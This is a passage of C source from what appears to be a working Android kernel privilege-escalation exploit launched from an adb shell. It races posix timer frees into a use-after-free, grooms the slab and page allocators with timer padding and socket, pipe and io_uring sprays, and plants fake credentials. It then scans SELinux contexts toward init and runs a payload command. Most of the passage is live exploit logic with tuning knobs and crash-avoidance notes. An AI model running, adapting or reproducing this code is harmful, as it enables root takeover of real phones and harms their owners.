 * turns that into a reboot.  Instead hand back the timers we are sure are
 * not on X, tell the parent to fork a fresh attempt, and keep the psl
 * sockets open forever.  SIGHUP/INT/TERM are ignored so that closing the
 * adb session cannot kill this process and trigger the same walk.
 */
static void ic_peak_park_attempt(void)
{
	static const int sigs[] = { SIGHUP, SIGINT, SIGTERM, SIGPIPE };
	unsigned int i;

	for (i = 0; i < sizeof(sigs) / sizeof(sigs[0]); i++)
		(void)signal(sigs[i], SIG_IGN);
	atomic_store_explicit(&g_peak_release, 1, memory_order_release);
	ic_safe_fill_release();
	/* The shield (and every other surviving pad/flush timer) holds a
	 * sigqueue against uid 2000's RLIMIT_SIGPENDING for as long as this
	 * process lives; give the slots back so the next attempt can create
	 * its timers. */
	ic_peak_release_pads();
	if (g_kept_count) {
		for (i = 0; i < g_kept_count; i++)
			(void)syscall(SYS_timer_delete, g_kept_pool[i]);
		free(g_kept_pool);
		g_kept_pool = NULL;
		g_kept_count = 0;
	}
	if (g_drain_count)
		ic_delete_drain_pool();
	if (g_retry_fd >= 0) {
		(void)!write(g_retry_fd, "R", 1);
		(void)close(g_retry_fd);
		g_retry_fd = -1;
	}
	fprintf(stderr, "[peak] attempt parked (%s)\n",
		g_mc.leak ? "X stays in the psl" :
			    "stale node stays in the task base");
	fflush(stderr);
}

static int ic_peak_attempt(void)
{
	struct timespec grace = { .tv_sec = 3 };
	struct timespec free_grace = { .tv_nsec = 500000000 };
	struct timespec settle = { .tv_nsec = 200000000 };
	struct timespec poll = { .tv_nsec = 1000000 };
	struct ic_release_timers release;
	struct ic_reap_result res;
	int padding[IC_SLAB_PADDING_TIMERS_MAX];
	int flush_ids[IC_FLUSH_TIMERS];
	unsigned int pool_count = 0;
	int *pool = NULL;
	long pad_base = -1;
	long pre_count = -1;
	long chain_base = -1, chain_a = -1, chain_b = -1, chain_c = -1;
	{
		const char *fg = getenv("IC_FREE_GRACE");

		if (fg) {
			unsigned long ms = strtoul(fg, NULL, 0);

			if (ms > 30000)
				ms = 30000;
			free_grace.tv_sec = (time_t)(ms / 1000);
			free_grace.tv_nsec =
				(long)((ms % 1000) * 1000000UL);
			fprintf(stderr, "[peak] free grace %lu ms\n", ms);
		}
	}
	{
		/* Test knob: the 3 s sleep is what lets the call_rcu() frees
		 * of the candidates and flushers run before the spray. */
		const char *gg = getenv("IC_GRACE_MS");

		if (gg) {
			unsigned long ms = strtoul(gg, NULL, 0);

			if (ms > 30000)
				ms = 30000;
			grace.tv_sec = (time_t)(ms / 1000);
			grace.tv_nsec =
				(long)((ms % 1000) * 1000000UL);
			fprintf(stderr, "[peak] grace %lu ms\n", ms);
		}
	}
	siginfo_t si;
	pid_t victim_a, victim_b;
	int status;
	uint64_t x = 0, winner = 0, page_va = 0;
	uint64_t partner_va = 0, zone_va = 0;
	volatile unsigned char *page, *partner = NULL, *zone = NULL;
	unsigned int off = 0, zone_off = 0;
	unsigned int i, iter;
	int parked = 0, cred_ready = 0;
	int skbf_min = 0;
	/* IC_SPRAY_EARLY: start the mcast spray immediately after the flush
	 * delete.  The discarded page can be taken by any order-1 slab
	 * allocation the moment it reaches the pcp list, so a spray that
	 * only begins after the prime/pool/skb waits is racing a window it
	 * has already lost. */
	int spray_early = getenv("IC_SPRAY_EARLY") != NULL;

	{
		struct rlimit rl;

		if (!getrlimit(RLIMIT_SIGPENDING, &rl))
			fprintf(stderr, "[peak] sigpending cur=%lu max=%lu\n",
				(unsigned long)rl.rlim_cur,
				(unsigned long)rl.rlim_max);
	}
	{
		const char *e;

		if ((e = getenv("IC_PAD_KEEP")))
			g_pad_keep = (unsigned int)strtoul(e, NULL, 0);
		if ((e = getenv("IC_PAD_SKIP")))
			g_pad_skip = (unsigned int)strtoul(e, NULL, 0);
		if ((e = getenv("IC_FLUSH_DEL")))
			g_flush_del = (unsigned int)strtoul(e, NULL, 0);
		if ((e = getenv("IC_PUSHERS")))
			g_pushers = (unsigned int)strtoul(e, NULL, 0);
		if (getenv("IC_PAD_ALIGN")) {
			/* The aligned padding ends with
			 * IC_SLAB_PADDING_TIMERS % 31 pads in X's slab, so
			 * exactly that many pads must go and the first
			 * 31 minus that many flushers are the ones which
			 * landed in the freed slots. */
			g_pad_align = 1;
			g_pad_skip = IC_SLAB_PADDING_TIMERS % 31;
			g_flush_del = 31 - g_pad_skip;
		}
		if ((e = getenv("IC_FLUSH_SPARSE")))
			g_flush_sparse = (unsigned int)strtoul(e, NULL, 0);
		if ((e = getenv("IC_POOL_TAIL_PRE")))
			g_pool_tail_pre = (unsigned int)strtoul(e, NULL, 0);
		if ((e = getenv("IC_POOL_TAIL_POST")))
			g_pool_tail_post = (unsigned int)strtoul(e, NULL, 0);
		if ((e = getenv("IC_SAFE_FILL")))
			g_safe_fill = (unsigned int)strtoul(e, NULL, 0);
		if (g_safe_fill > IC_SAFE_FILL_MAX)
			g_safe_fill = IC_SAFE_FILL_MAX;
		if (g_pad_keep > IC_SLAB_PADDING_TIMERS)
			g_pad_keep = IC_SLAB_PADDING_TIMERS;
		if (g_pad_skip > IC_SLAB_PADDING_TIMERS)
			g_pad_skip = IC_SLAB_PADDING_TIMERS;
		if (g_pushers > IC_PUSHERS_MAX)
			g_pushers = IC_PUSHERS_MAX;
		fprintf(stderr,
			"[peak] shield pad_keep=%u pad_skip=%u flush_del=%u sparse=%u pool_pre=%u pool_post=%u pushers=%u fill=%u align=%d early=%d\n",
			g_pad_keep, g_pad_skip, g_flush_del, g_flush_sparse,
			g_pool_tail_pre, g_pool_tail_post, g_pushers,
			g_safe_fill, g_pad_align, spray_early);
	}
	ic_capture_cpu_map();
	ic_pin_cpu_index(0);
	/* Opened before the padding exists: see ic_sladb_open(). */
	ic_sladb_open();
	/* Same for the pageset counter: the gate reads it in the window
	 * between X's discard and the spray, and must not allocate there. */
	ic_zoneinfo_preopen();
	ic_sladb("start");
	/* IC_XCAP: fill kmalloc-256's partial slabs before X is freed, so the
	 * spray at the reclaim point must take fresh order-1 slab pages. */
	if (getenv("IC_XCAP"))
		(void)ic_xcap_prepare();
	/* IC_SPRAY=mcast: the sockets have to exist before the drain; only the
	 * join+filter allocations are made at the reclaim point. */
	if (ic_reap_use_mcast())
		(void)ic_mcast_prepare();
	memset(&g_state, 0, sizeof(g_state));
	memset(&release, 0, sizeof(release));
	memset(&res, 0, sizeof(res));
	memset(padding, 0xff, sizeof(padding));
	memset(flush_ids, 0xff, sizeof(flush_ids));
	g_peak_pad_ids = padding;
	g_peak_flush_ids = flush_ids;
	atomic_store_explicit(&g_peak_release, 0, memory_order_release);
	atomic_store_explicit(&g_poc_success, 0, memory_order_relaxed);
	g_peak_count = 0;

	/* KASLR-independent: cred->user/user_ns/group_info point at fakes on
	 * the sibling page of the leaked order-1 block, so no symbol address
	 * (and no root in the harness) is needed. */
	g_peak_fork_helper = getenv("IC_FORK") != NULL;
	g_peak_scan_mode = getenv("IC_SCAN") != NULL;
	g_peak_trace = getenv("IC_PEAK_TRACE") != NULL;
	{
		const char *sid = getenv("IC_PEAK_SID");

		if (sid && *sid)
			g_peak_sid_override =
				(unsigned int)strtoul(sid, NULL, 0);
	}
	if (g_peak_scan_mode) {
		const char *e = getenv("IC_SCAN_EXEC");
		const char *m = getenv("IC_SCAN_MAX");

		/* g_helper_path is filled in by ic_stage_helper() below; the
		 * pointer stays valid either way. */
		g_peak_scan_exec = e && *e ? e : g_helper_path;
		g_peak_scan_max = m ? (unsigned int)strtoul(m, NULL, 0) : 0;
		g_peak_policy_path = getenv("IC_SCAN_POLICY");
		g_peak_probe_path = getenv("IC_SCAN_PROBE");
		g_peak_probe_label = getenv("IC_SCAN_PROBE_LABEL");
		g_peak_exec_label = getenv("IC_SCAN_EXEC_LABEL");
		g_peak_scan_inproc = getenv("IC_SCAN_INPROC") != NULL;
		g_peak_scan_all = getenv("IC_SCAN_ALL") != NULL;
		g_scan_exit_after_drop =
			getenv("IC_SCAN_EXIT_AFTER_DROP") != NULL;
		{
			const char *cm = getenv("IC_SCAN_CTXMAP");

			if (cm) {
				g_peak_ctxmap = 1;
				g_peak_ctxmap_target = *cm && strcmp(cm, "1")
					? cm : "u:r:init:s0";
			}
		}
		g_peak_drop_dir = getenv("IC_SCAN_DROP_DIR");
		if (getenv("IC_PREP_DROP"))
			(void)ic_peak_prep_drop();
		g_peak_interp_path = getenv("IC_SCAN_INTERP");
		{
			const char *ae = getenv("IC_AIO_TEST_EVENTS");

			if (ae)
				g_aio_test_events =
					(unsigned int)strtoul(ae, NULL, 0);
		}
		if (getenv("IC_DROP_MEM")) {
			int cr = ic_self_capture(NULL);

			g_drop_mem = 1;
			fprintf(stderr, "[scan] self capture rc=%d len=%zu\n",
				cr, g_self_len);
			fflush(stderr);
		}
		if (getenv("IC_SCAN_CTXS"))
			g_peak_scan_ctxs = getenv("IC_SCAN_CTXS");
		if (getenv("IC_SCAN_ACCESS_FILE"))
			g_peak_access_file = getenv("IC_SCAN_ACCESS_FILE");
		if (g_peak_probe_path && *g_peak_probe_path)
			snprintf(g_scan_probe_env, sizeof(g_scan_probe_env),
				 "IC_SCAN_PROBE=%s", g_peak_probe_path);
		{
			const char *pc = getenv("IC_PAYLOAD_CMD");

			if (pc && *pc)
				snprintf(g_payload_env, sizeof(g_payload_env),
					 "IC_PAYLOAD_CMD=%s", pc);
		}
		fprintf(stderr, "[scan] probe %s\n", g_scan_probe_env);
		fflush(stderr);
	}
	/* Must run after the scan env is parsed (g_peak_ctxmap_target is only
	 * set there) and before any fake cred exists.  A denied attr/exec write
	 * still interns the context in the sidtab, which is what lets the sid
	 * scan reach a domain no process has entered yet on the device. */
	if (getenv("IC_INTERN_SELF")) {
		fprintf(stderr, "[peak] intern self=%d target=%s\n",
			getenv("IC_INTERN_SELF") ? 1 : 0,
			g_peak_ctxmap_target ? g_peak_ctxmap_target : "(null)");
		fflush(stderr);
		ic_peak_intern_ctx(g_peak_ctxmap_target);
	}
	fprintf(stderr, "[peak] start in-page cred fakes fork=%d scan=%d\n",
		g_peak_fork_helper, g_peak_scan_mode);

	/* Harness-only: answer policy questions without running the race.
	 * Load the live policy while permissive, run the "scon tcon class
	 * perm" queries and exit, so permission tables can be checked in
	 * seconds instead of waiting for a leak. */
	if (getenv("IC_SCAN_ACCESS_ONLY")) {
		if (g_peak_policy_path && *g_peak_policy_path)
			ic_peak_policy_load(g_peak_policy_path);
		ic_peak_access_file_run(g_peak_access_file);
		fprintf(stderr, "[scan] access-only done\n");
		fflush(stderr);
		return 0;
	}

	if (getenv("IC_VMA_PREWARM")) {
		unsigned long total = strtoul(getenv("IC_VMA_PREWARM"), NULL, 0);
		unsigned long keep = 10;
		const char *kp = getenv("IC_VMA_KEEP");

		if (kp)
			keep = strtoul(kp, NULL, 0);
		if (total && total <= (1UL << 20))
			ic_vma_prewarm((unsigned int)total, (unsigned int)keep);
	}

	if (getenv("IC_PREWARM_PARTIAL")) {
		unsigned long total = strtoul(getenv("IC_PREWARM_PARTIAL"),
					      NULL, 0);
		unsigned long keep = 20;
		const char *kp = getenv("IC_PREWARM_KEEP");

		if (kp)
			keep = strtoul(kp, NULL, 0);
		if (total && total <= (1UL << 20))
			(void)ic_prewarm_spray_caches((unsigned int)total,
						      (unsigned int)keep);
	}

	{
		const char *fs = getenv("IC_FILP_SHIELD");
		unsigned long n = fs ? strtoul(fs, NULL, 0) : 0;

		if (fs && n <= 1 && ic_reap_use_aio())
			n = 18000;
		if (n && n <= IC_FILP_SHIELD_MAX)
			(void)ic_filp_shield((unsigned int)n);
	}
	{
		const char *ks = getenv("IC_KM64_SHIELD");
		unsigned long n = ks ? strtoul(ks, NULL, 0) : 0;

		if (ks && n <= 1 && ic_reap_use_aio())
			n = 4096;
		if (n && n <= IC_KM64_SHIELD_MAX)
			(void)ic_km64_shield((unsigned int)n);
	}

	ic_slab_tune();

	if (ic_stage_helper()) {
		fprintf(stderr, "[peak] stage helper failed\n");
		return -1;
	}
	if (ic_peak_setup_workers())
		return -1;
	/* Create the spray socket before the chain: socket() plus its file and
	 * inode are unmovable slab allocations that must not steal the pool
	 * pages at spray time.  The ring blocks themselves are allocated by
	 * setsockopt() inside ic_packet_spray(). */
	if (ic_reap_use_packet() && ic_packet_prepare())
		fprintf(stderr, "[peak] packet prepare failed\n");
	/* perf fds are opened (and perf_buffer cache slots warmed) before the
	 * pool free; only the user_page mmap happens at spray time. */
	if (ic_reap_use_perf() && ic_perf_prepare())
		fprintf(stderr, "[peak] perf prepare failed\n");
	/* Pipe spray: pipe(), its files, dentries and inodes are all created
	 * here, before the pool free; the write(2) path only allocates the
	 * order-0 data page. */
	if (ic_reap_use_pipe() && ic_pipe_prepare())
		fprintf(stderr, "[peak] pipe prepare failed\n");
	if (ic_reap_use_unix() && ic_unx_prepare())
		fprintf(stderr, "[peak] unix prepare failed\n");
	if (ic_reap_use_pipe() && ic_pipes.pattern)
		ic_reap_write_pattern(ic_pipes.pattern, 0, 0); /* pre-fault */
	if (ic_create_pushers(g_pushers)) {
		fprintf(stderr, "[peak] pushers failed after %u\n",
			g_pusher_count);
		return -1;
	}
	if (g_pusher_count)
		fprintf(stderr, "[peak] pushers=%u\n", g_pusher_count);
	/* Must run after the pushers: their timers move the cache's active
	 * slab off the boundary the padding needs. */
	if (g_pad_align) {
		if (ic_align_pad_block())
			return -1;
		ic_sladb("aligned");
	}
	if (ic_create_slab_padding(padding)) {
		fprintf(stderr, "[peak] padding failed\n");
		return -1;
	}
	/* Slab-count oracle for the A -> B -> candidate hand-off.
	 *
	 * The padding leaves X's slab with exactly 16 free objects and every
	 * other slab full, so the whole chain fits without one new slab: A
	 * takes one of the 16, its call_rcu() free hands that slot back, B
	 * takes it, its free hands it back, candidate 0 takes it and the
	 * other 15 candidates take the rest.  num_objs therefore has to stay
	 * put across the three steps.  A fresh 31-object slab anywhere means
	 * a free landed where the next timer_create() did not look (remote
	 * SLUB free, late RCU callback, or a foreign posix timer on cpu0
	 * stealing the slot) and the object at X is *not* our candidate:
	 * reaping A would run timerqueue_del() on a free object and oops the
	 * kernel, which is exactly what rebooted the phone in run12.  Park
	 * before the reap instead and let the harness fork a fresh attempt.
	 *
	 * The counters only move when SLUB allocates or discards a slab, so
	 * ordinary foreign timer traffic (a create or delete inside an
	 * existing slab) does not perturb the comparison. */
	chain_base = ic_sladb_count();
	ic_sladb("pre-A");
	/* Victim A: dies through the non-leader exec() bug. */
	victim_a = fork();
	if (victim_a < 0)
		return -1;
	if (!victim_a)
		ic_run_target();
	if (ic_wait_zombie_without_reap(victim_a, &si)) {
		fprintf(stderr, "[peak] A wait_zombie failed\n");
		return -1;
	}
	fprintf(stderr, "[peak] A zombie\n");
	chain_a = ic_sladb_count();
	ic_sladb("A-zombie");
	nanosleep(&grace, NULL);	/* call_rcu() free of A's timer */

	/* Victim B: its early timer_create() must reuse A's slot. */
	victim_b = fork();
	if (victim_b < 0)
		return -1;
	if (!victim_b)
		ic_run_target();
	if (ic_wait_zombie_without_reap(victim_b, &si)) {
		fprintf(stderr, "[peak] B wait_zombie failed\n");
		return -1;
	}
	fprintf(stderr, "[peak] B zombie\n");
	chain_b = ic_sladb_count();
	ic_sladb("B-zombie");
	nanosleep(&grace, NULL);	/* call_rcu() free of B's timer */

	/* Candidate 0 pops B's (== A's) slot and is armed on worker 0. */
	if (ic_peak_create_candidates()) {
		fprintf(stderr, "[peak] candidates failed\n");
		return -1;
	}
	fprintf(stderr, "[peak] candidates=%u armed\n", g_peak_count);
	chain_c = ic_sladb_count();
	ic_sladb("cand");
	if (chain_base > 0 && chain_a > 0 && chain_b > 0 && chain_c > 0) {
		long d_a = chain_a - chain_base;
		long d_b = chain_b - chain_a;
		long d_c = chain_c - chain_b;

		fprintf(stderr,
			"[peak] chain base=%ld A=%ld B=%ld C=%ld d=%ld/%ld/%ld\n",
			chain_base, chain_a, chain_b, chain_c, d_a, d_b, d_c);
		fflush(stderr);
		if (d_a || d_b || d_c) {
			fprintf(stderr,
				"[peak] chain broke, X holds no candidate: "
				"parking before reap A\n");
			fflush(stderr);
			ic_peak_park_attempt();
			for (;;)
				pause();
		}
	}

	/* Reap A: cleanup_timerqueue() on A's base finds the live candidate
	 * at the same slot, clears ctmr->head, and leaves worker 0's base
	 * pointing at the node. */
	if (waitpid(victim_a, &status, 0) != victim_a) {
		fprintf(stderr, "[peak] A reap failed\n");
		return -1;
	}
	fprintf(stderr, "[peak] A reaped status=0x%x\n", status);
	ic_log_sync();
	nanosleep(&settle, NULL);

	ic_peak_delete_candidates();
	g_peak_doomed = 1;
	fprintf(stderr, "[peak] candidates deleted\n");
	ic_log_sync();
	nanosleep(&grace, NULL);	/* call_rcu() frees, X back on cpu0 */

	/* The 16 candidate slots in X's slab are back on cpu0's freelist, so
	 * the first flusher timers land in X's slab itself; the remaining ones
	 * fill fresh slabs.  They have to be created before the drain pool:
	 * timer_create() stops at RLIMIT_SIGPENDING (15585 here), and the pool
	 * otherwise eats every remaining slot. */
	if (ic_create_flush_timers(flush_ids))
		fprintf(stderr, "[peak] flush timers failed\n");
	else
		fprintf(stderr, "[peak] flush timers=%d\n", IC_FLUSH_TIMERS);
	ic_log_sync();

	/* The pool fills the remaining freelist slots (the handful of
	 * candidate slots the flushers did not take) and then a few hundred
	 * fresh slabs.  The padding drops only once the pool has filled X's
	 * slab, so its first pool timers are all that keep the slab busy when
	 * the flushers are later freed.  The primes flush the pcp lists so the
	 * discarded order-1 block reaches the buddy allocator, where an
	 * order-1 spray can take it whole.
	 *
	 * Order-0 sprays (AIO rings, pipe pages, anon pages) can only split
	 * the block once the buddy's order-0 Unmovable list is dry, so the
	 * block has to sit in the buddy, not on the per-CPU order-1 list.
	 * IC_PEAK_SKBF queues order-2 AF_UNIX datagrams here and frees them
	 * synchronously after the pool free: free_unref_page_commit() of an
	 * order-2 page takes the free_high path (free_factor != 0) and
	 * bulk-drains every pcp list, including parked order-1 slabs, to the
	 * buddy.  That is the same sequence the reap path uses.  io_uring is
	 * also what the target exposes to an adb shell process: adbd installs
	 * no seccomp filter (no seccomp_policy in adbd.rc, no seccomp call in
	 * the daemon), and the vendor kernel keeps io_uring compiled in with
	 * no io_uring_disabled sysctl. */
	/* IC_SPRAY_EARLY does not drain the pcp: the discarded order-1 slab
	 * should stay at the head of cpu0's order-1 free list, where the
	 * mcast spray's next fresh slab request pops it directly.  The 496 MB
	 * queue would only add memory pressure and delay the spray.
	 * IC_EARLY_PRIME is the exception: it needs the queued datagrams to
	 * take the pageset down before the flush delete (see ic_pcp_prime_low),
	 * and only frees a bounded prefix of them there. */
	if ((!spray_early || getenv("IC_EARLY_PRIME")) &&
	    getenv("IC_PEAK_SKBF") && ic_skb_prepare())
		fprintf(stderr, "[peak] skb prepare failed\n");
	if (getenv("IC_ALLOCDBG")) {
		ic_pagetype_stat("pre-pool");
		ic_slab_stat("pre-pool");
	}
	if (ic_create_drain_pool())
		goto fail;
	ic_sladb("post-pool");
	if (getenv("IC_ALLOCDBG")) {
		ic_pagetype_stat("post-pool");
		ic_slab_stat("post-pool");
	}
	if (g_pool_tail_pre) {
		ic_free_pool_tail(g_pool_tail_pre);
		fprintf(stderr, "[peak] pool tail pre=%u left=%u\n",
			g_pool_tail_pre, g_drain_count);
	}
	fprintf(stderr, "[peak] padding del\n");
	if (ic_delete_slab_padding(padding))
		goto fail;
	ic_sladb("pad-del");
	if (g_slabtrace_on) {
		/* The pad frees reach the cache over several RCU batches, so
		 * wait for the counters to go quiet instead of a fixed 3 s.
		 * Only then is a later num_objs drop unambiguously ours. */
		pad_base = ic_sladb_wait_stable(500, 10000);
	} else {
		nanosleep(&grace, NULL);
	}
	ic_sladb("post-pad-sleep");
	if (getenv("IC_ALLOCDBG")) {
		ic_pagetype_stat("pad-drop");
		ic_slab_stat("pad-drop");
	} else if (getenv("IC_SPRAYDBG")) {
		/* Taken before X's slab is freed, so these opens cannot steal
		 * the block; the delta against post-spray names the caches that
		 * allocated slab pages during the reclaim. */
		ic_slab_spray_stat("pad-drop");
	}
	/* Order matters: push the sparse slabs first, while X's slab is still
	 * partial (the 16 flushers are alive).  Each push deactivates a full
	 * slab with one free slot; put_cpu_partial() drains the list once
	 * cpu_partial_slabs (4) accumulate, and __unfreeze_partials() moves the
	 * non-empty slabs -- X's among them -- to the node partial list.  A
	 * drain that runs while X is already empty instead either discards it
	 * or, when the node has fewer than min_partial slabs, leaves it empty
	 * on the node list where the posix fill can take it back; run5 showed
	 * exactly that.  The flush delete below then frees X's last objects on
	 * an unfrozen slab: the final __slab_free() takes the node lock and
	 * discards an empty slab immediately (slab_empty path) once the node
	 * holds min_partial partial slabs, which the sparse pushes ensure. */
	/* IC_EARLY_PRIME: take cpu0's pageset down now, while X's slab is
	 * still allocated and nothing we care about is in the pcp.  Doing it
	 * here (not after the drop) is the whole point: a pageset still near
	 * its high mark drains itself when X's order-1 page is freed, and the
	 * page then has to come back out of the buddy through whatever merges
	 * the dump left behind.  Sampling needs no privilege and costs ~1 ms. */
	pre_count = -1;
	if (spray_early && getenv("IC_EARLY_PRIME")) {
		unsigned long maxd = strtoul(getenv("IC_EARLY_PRIME"), NULL, 0);
		unsigned int slack = 512;

		if (!maxd)
			maxd = 1024;
		if (getenv("IC_EARLY_SLACK")) {
			unsigned long sl = strtoul(getenv("IC_EARLY_SLACK"),
						   NULL, 0);

			if (sl >= 8 && sl < 2048)
				slack = (unsigned int)sl;
		}
		ic_pcp_log("pre-prime");
		if (ic_pcp_prime_low(slack, maxd) < 0)
			fprintf(stderr, "[pcp] prime failed\n");
		ic_pcp_log("post-prime");
		/* Nothing irreversible has happened yet, so a pageset we could
		 * not take down parks instead of gambling X's page on it. */
		if (getenv("IC_EARLY_GATE") && ic_pcp_headroom() < 256) {
			fprintf(stderr,
				"[pcp] pageset still near high, park\n");
			ic_log_sync();
			ic_peak_park_attempt();
			for (;;)
				pause();
		}
	}
	if (g_flush_sparse) {
		unsigned int k;

		for (k = 1; k <= g_flush_sparse; k++) {
			unsigned int idx = k * 31;
			int id;

			if (idx >= IC_FLUSH_TIMERS)
				break;
			id = flush_ids[idx];
			if (id < 0)
				continue;
			if (!syscall(SYS_timer_delete, id)) {
				flush_ids[idx] = -1;
				fprintf(stderr,
					"[peak] sparse push %u/%u id=%u\n",
					k, g_flush_sparse, idx);
			}
		}
		ic_sladb("sparse");
	}
	/* Last reading taken while the flush timers are still alive: the
	 * insert itself adds 2 to this, and the gate after the drop compares
	 * against it. */
	if (spray_early && getenv("IC_EARLY_PRIME"))
		pre_count = ic_pcp_log("pre-flush");
	if (ic_delete_flush_timers(flush_ids))
		fprintf(stderr, "[peak] flush delete failed\n");
	ic_sladb("flush-del");
	/* X's slab emptied with the flush delete above; the pusher frees now
	 * overflow the per-CPU partial list and discard it.  The pushers are
	 * many slabs below X, so the freed block cannot merge upward. */
	if (g_pusher_count) {
		if (ic_delete_pushers())
			fprintf(stderr, "[peak] pusher delete failed\n");
		else
			fprintf(stderr, "[peak] pushers freed=%u\n",
				g_pusher_count);
	}
	if (g_pool_tail_post) {
		ic_free_pool_tail(g_pool_tail_post);
		fprintf(stderr, "[peak] pool tail post=%u left=%u\n",
			g_pool_tail_post, g_drain_count);
	}
	if (spray_early) {
		/* Deliberately no drop wait by default: the spray below must
		 * already be running when the discard lands.  run13 showed the
		 * cost of that race - the RCU discard completed only after the
		 * whole early spray, X's slot stayed free, and the B reap
		 * erased through the encoded freepointer at node+8.  With
		 * IC_EARLY_WAIT we give up the head start and start the spray
		 * the moment the drop is visible: the discarded page is then
		 * at the head of cpu0's pcp list, so the spray's first fresh
		 * kmalloc-256 slab pops it and fills all 32 slots. */
		if (getenv("IC_EARLY_WAIT") && g_slabtrace_on && pad_base > 0) {
			long ms = ic_sladb_wait_drop(pad_base, 5000);
			long a, t;

			if (ic_sladb_pair(&a, &t))
				a = t = -1;
			fprintf(stderr,
				"[peak] early discard seen=%ld ms active=%ld total=%ld\n",
				ms, a, t);
			ic_log_sync();
			if (ms < 0) {
				/* Nothing has touched X yet (no spray ran), so
				 * this is a plain miss: park instead of
				 * spraying into a page we cannot reach. */
				fprintf(stderr,
					"[peak] early discard missing, park\n");
				ic_peak_park_attempt();
				for (;;)
					pause();
			}
			/* The page is now the newest order-1 free, i.e. at the
			 * head of cpu0's order-1 list -- unless the pageset was
			 * still near its high mark and the insert drained it.
			 * That is a miss we can read off the counter, so park
			 * before the spray instead of reaping B into a page in
			 * the buddy (run14's panic). */
			if (pre_count >= 0 && getenv("IC_EARLY_GATE") &&
			    ic_pcp_drop_bad(pre_count)) {
				fprintf(stderr,
					"[pcp] pageset drained at X's insert, park\n");
				ic_log_sync();
				ic_peak_park_attempt();
				for (;;)
					pause();
			}
		}
	} else if (g_slabtrace_on && pad_base > 0) {
		/* X's slab is the only slab the sparse/flush deletes can empty
		 * (the sparse pushes free one object from distinct partial
		 * slabs), so its discard is the first >= 31-object drop.  Wait
		 * for it instead of sleeping: every millisecond the page sits
		 * on cpu0's pcp list it is at risk of being claimed by another
		 * allocation before our spray reaches it. */
		long ms = ic_sladb_wait_drop(pad_base, 3000);
		long a, t;

		if (ic_sladb_pair(&a, &t))
			a = t = -1;
		fprintf(stderr, "[peak] discard seen=%ld ms active=%ld total=%ld\n",
			ms, a, t);
	} else {
		nanosleep(&grace, NULL);
	}
	ic_sladb("post-grace2");
	if (getenv("IC_ALLOCDBG")) {
		ic_pagetype_stat("post-flush");
		ic_slab_stat("post-flush");
	}

	if (!spray_early && ic_prime_pcp())
		goto fail;
	ic_sladb("post-prime");
	pool_count = g_drain_count;
	pool = g_drain_pool;
	g_drain_count = 0;
	g_drain_pool = NULL;
	if (!pool) {
		fprintf(stderr, "[peak] pool missing\n");
		goto fail;
	}
	if (getenv("IC_KEEP_POOL")) {
		/*
		 * X's slab was already discarded at the flusher overflow above.
		 * Freeing the drain pool afterwards only pushes ~350 more
		 * order-1 blocks on top of it in the pcp/buddy lists, which an
		 * order-0 spray must then split through before it can reach X.
		 * Keep the timers allocated instead; the RLIMIT_SIGPENDING
		 * headroom left is enough for the trigger timers below.
		 */
		fprintf(stderr, "[peak] pool=%u kept\n", pool_count);
		g_kept_pool = pool;
		g_kept_count = pool_count;
		pool = NULL;
		pool_count = 0;
	} else {
	fprintf(stderr, "[peak] pool=%u free\n", pool_count);
	if (getenv("IC_REVERSE")) {
		for (i = pool_count; i > 0; i--)
			(void)syscall(SYS_timer_delete, pool[i - 1]);
	} else {
		for (i = 0; i < pool_count; i++)
			(void)syscall(SYS_timer_delete, pool[i]);
	}
	free(pool);
	pool = NULL;
	pool_count = 0;
	}
	if (!spray_early)
		nanosleep(&free_grace, NULL);
	if (getenv("IC_ALLOCDBG")) {
		ic_pagetype_stat("post-free");
		ic_pcp_stat("post-free");
		ic_slab_stat("post-free");
		if (getenv("IC_DUMPPT")) {
			ic_dump_file("/proc/pagetypeinfo", "pt-post-free");
			ic_dump_file("/proc/buddyinfo", "buddy-post-free");
		}
	}
	if (getenv("IC_PEAK_DIAG")) {
		fprintf(stderr, "[peak] diag stop after free\n");
		fflush(stderr);
		_exit(0);
	}
	/* Parked order-1 slabs first: the SKB flush's order-2 free burst
	 * raises free_factor and then takes the free_high path, bulk-draining
	 * every pcp list so an order-0 spray can split the block.  Without
	 * SKBs, just decay-proof the pcp before the spray.
	 *
	 * IC_SKBF_MIN=N frees only N datagrams before the spray: one order-2
	 * free is already enough to bulk-drain a primed pcp, and the other
	 * 32319 frees would otherwise flood the buddy with ~500 MB of order-2
	 * blocks right before the order-1 spray, which is exactly how the
	 * discarded slab gets merged and buried.  The rest is freed after the
	 * spray, when the block is either ours already or out of reach. */
	if (spray_early) {
		/* No pre-spray drain and no prime: both cost milliseconds the
		 * discard window does not have.  The remaining datagrams are
		 * flushed right after the safe fill (skbf_min below). */
		skbf_min = 1;
	} else if (ic_skb.queued) {
		const char *mn = getenv("IC_SKBF_MIN");

		if (getenv("IC_ALLOCDBG")) {
			ic_pagetype_stat("pre-flush");
			ic_pcp_stat("pre-flush");
		}
		if (mn) {
			unsigned long n = strtoul(mn, NULL, 0);
			unsigned long done;

			if (n < 1 || n > 4096)
				n = 8;
			(void)ic_prime_pcp();
			done = ic_skb_flush_n(n);
			fprintf(stderr, "[peak] min drain=%lu/%lu skb\n", done,
				n);
			skbf_min = 1;
		} else {
			(void)ic_skb_flush_primed();
		}
		if (getenv("IC_ALLOCDBG")) {
			ic_pagetype_stat("post-flush");
			ic_pcp_stat("post-flush");
			ic_slab_stat("post-flush");
		}
	} else {
		(void)ic_prime_pcp();
	}
	if (getenv("IC_ALLOCDBG")) {
		ic_pagetype_stat("pre-spray");
		ic_pcp_stat("pre-spray");
		ic_slab_spray_stat("pre-spray");
		if (getenv("IC_DUMPPT"))
			ic_dump_file("/proc/zoneinfo", "zone-pre-spray");
	}
	/* IC_XCAP: the first order-1 UNMOVABLE slab page requested here must
	 * pop the same pcp list entry that io_uring's ring pages would take.
	 * With IC_XCAP_ONLY the slab is the only reclaim and B's self-write
	 * is read back with getxattr; otherwise the regular spray still runs
	 * and its leak is the negative control (it must disappear). */
	if (getenv("IC_XCAP"))
		ic_xcap_spray();
	fprintf(stderr, "[peak] spray\n");
	ic_sladb("pre-spray-mcast");
	if (getenv("IC_XCAP_ONLY")) {
		memset(&res, 0, sizeof(res));
	} else if (ic_reap_spray(0, &res)) {
		fprintf(stderr, "[peak] spray failed\n");
		goto fail;
	}
	fprintf(stderr, "[peak] spray pages=%lu\n", res.npages);
	if (spray_early && getenv("IC_EARLY_PRIME"))
		ic_pcp_log("post-spray");
	ic_sladb("post-spray");
	if (ic_mcast.nfd)
		fprintf(stderr,
			"[peak] mcast socks=%u groups=%u made=%u tail=%u err=%u\n",
